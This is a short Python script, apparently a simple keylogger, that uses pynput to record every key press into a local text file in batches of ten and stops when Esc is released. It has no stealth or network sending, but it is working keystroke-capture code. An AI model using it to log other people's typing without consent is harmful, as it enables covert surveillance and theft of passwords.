import os
import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []


def press(key):
    global count, keys

    keys.append(key)
    count += 1

    if count >= 10:
        save(keys)

        count = 0
        keys = []


def save(keys):
    with open("./pressed_keys.txt", encoding='utf-8', mode="a") as file:
        for raw_key in keys:
            key = str(raw_key).replace("'", "")

            if key.find("space") > 0:
                file.write(os.linesep)
            elif key.find("key") == -1:
                file.write(key)


def release(key):
    if key == Key.esc:
        return False


with Listener(on_press=press, on_release=release) as listner:
    listner.join()
